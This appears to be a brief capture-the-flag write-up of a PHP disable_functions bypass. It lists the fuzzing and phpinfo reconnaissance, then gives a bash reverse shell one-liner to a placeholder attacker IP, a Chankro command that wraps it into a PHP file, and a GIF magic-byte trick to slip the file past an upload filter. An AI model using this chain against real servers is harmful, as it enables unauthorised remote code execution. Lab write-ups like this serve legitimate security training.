open website.

fuff the site.

got phpinfo, uploads folder.

phpinfo get absolute path.(root path)

try with test file get php execution.

build rev payload

`bash -c 'bash -i >& /dev/tcp/attacker_ip/port_num 0>&1'`

use chankro script to get php file.

`python chankro.py --arch 64 --input cmd.sh --output tron.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`

create payload. edit it add gif magic bytes. `GIF89a`

upload file.

got flag.

```bash
www-data@ubuntu:/home/s4vi$ cat flag.txt
cat flag.txt
thm{bypass_d1sable_functions_1n_php}


```